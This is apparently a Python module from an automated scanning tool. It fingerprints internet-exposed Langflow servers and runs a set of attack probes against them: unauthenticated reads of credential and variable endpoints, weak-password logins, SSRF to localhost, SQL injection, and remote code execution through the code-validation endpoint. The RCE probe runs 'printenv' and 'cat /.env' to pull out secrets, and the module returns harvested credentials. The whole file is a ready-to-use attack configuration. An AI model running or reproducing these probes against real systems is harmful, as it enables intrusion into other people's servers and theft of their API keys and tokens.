"""Langflow prober — public flows/config + weak password + optional RCE/SSRF."""

from __future__ import annotations

import logging
from typing import Any

from aipocket.core.models import Credential

from ..base import Prober
from ..capability import ProbeSpec, RiskLevel, VulnClass
from ._l2l3 import sqli_spec

log = logging.getLogger(__name__)

SPECS = [
    ProbeSpec(
        id="langflow.unauth",
        product="langflow",
        vuln_class=VulnClass.UNAUTH_READ,
        risk_level=RiskLevel.L0,
        entry={
            "paths": [
                "/api/v1/flows",
                "/api/v1/config",
                "/api/v1/variables",
                "/api/v1/credentials",
                "/api/all-flows",
            ],
            "tag_prefix": "langflow",
        },
        max_requests=6,
    ),
    ProbeSpec(
        id="langflow.weak_password",
        product="langflow",
        vuln_class=VulnClass.WEAK_PASSWORD,
        risk_level=RiskLevel.L1,
        entry={
            "auth_style": "login_json",
            "login": "/api/v1/login",
            "body": {"username": "{user}", "password": "{pass}"},
            "token_fields": ["access_token", "token", "refresh_token"],
            "post_auth_paths": [
                "/api/v1/flows",
                "/api/v1/variables",
                "/api/v1/credentials",
            ],
        },
        max_requests=12,
    ),
    ProbeSpec(
        id="langflow.ssrf",
        product="langflow",
        vuln_class=VulnClass.SSRF,
        risk_level=RiskLevel.L2,
        entry={
            "path": "/api/v1/validate/code",
            "method": "POST",
            "url_param": "url",
            "body": {},
            "target_urls": ["http://127.0.0.1/", "http://localhost/"],
            "use_auth": True,
        },
        max_requests=3,
    ),
    ProbeSpec(
        id="langflow.rce",
        product="langflow",
        vuln_class=VulnClass.RCE,
        risk_level=RiskLevel.L3,
        entry={
            "path": "/api/v1/validate/code",
            "method": "POST",
            "param": "code",
            "proof_command": "echo aipocket-rce-proof",
            "secret_commands": ["printenv", "cat /.env"],
            "body": {},
            "use_auth": False,
        },
        max_requests=2,
    ),
    sqli_spec(
        "langflow",
        path="/api/v1/flows",
        param="name",
        use_auth=False,
        suffix="sqli_flows",
    ),
]


class LangflowProber(Prober):
    product_name = "langflow"

    @classmethod
    def identify(cls, hit: dict[str, Any]) -> bool:
        blob = (hit.get("title", "") + hit.get("header", "") + hit.get("banner", "")).lower()
        return "langflow" in blob

    async def probe(self, hit: dict[str, Any]) -> list[Credential]:
        return await self.run_specs(hit, SPECS)
